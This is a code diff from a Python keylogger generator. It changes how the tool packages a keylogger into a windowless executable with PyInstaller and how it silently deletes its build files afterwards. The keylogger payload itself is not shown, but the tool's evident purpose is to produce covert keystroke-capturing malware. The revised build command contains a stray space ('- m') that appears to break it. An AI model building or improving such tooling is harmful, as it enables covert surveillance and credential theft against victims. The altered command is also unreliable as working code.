@@ -102,17 +102,20 @@ def generate_keylogger(inputs_dict):
         print(colors.Green + '[✓]Source File coppied to working directory')
 
         print(colors.Yellow + '[!]Creating Executables.. this may take some time....')
-        check_output('pyinstaller {}.py --onefile --noconsole'.format(inputs_dict['PNAME']), shell=True, stderr=devnull)
+        check_output('python3 - m PyInstaller {}.py --onefile --noconsole'.format(inputs_dict['PNAME']), shell=True, stderr=devnull)
         print(colors.Green + '[✓]Executables created success fully')
         print(colors.Green + '[✓]Your files have been saved to {}Dist{} {}dirrectory'.format(colors.BOLD, colors.RESET, colors.Green))
 
         print(colors.Yellow + '[!]Removing temp files......')
-        name = program_path + '/' + inputs_dict['PNAME']
-        check_output("rm '{}'.py".format(name), shell=True)
-        check_output("rm '{}'.spec".format(name), shell=True)
-        check_output("rm -R '{}/'build".format(program_path), shell=True)
-        check_output("rm -R '{}/'__pycache__".format(program_path), shell=True)
-        print(colors.Green + '[✓]Generation successful\n' + colors.RESET)
+        try:
+            name = program_path + '/' + inputs_dict['PNAME']
+            check_output("rm '{}'.py".format(name), shell=True)
+            check_output("rm '{}'.spec".format(name), shell=True)
+            check_output("rm -R '{}/'build".format(program_path), shell=True)
+            check_output("rm -R '{}/'__pycache__".format(program_path), shell=True)
+            print(colors.Green + '[✓]Generation successful\n' + colors.RESET)
+        except:
+            pass
 
     except Exception as error:
         print(colors.Red + '[✘]Erroro occured while activating the virtual environment')
@@ -176,8 +179,8 @@ def activate_generation(program_path):
                 setting = command.split()[1]
                 new_value = command.split()[2]
                 saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
-            except IndexError:
-                print(colors.Red + "[✘]Invalid Syntax use 'help' command to view the help guide" + colors.RESET)
+            except Exception as error:
+                print(colors.Red + '[✘]Error: {}'.format(error) + colors.RESET)
 
         # if the command is non of above it is a unreconised command
         else:
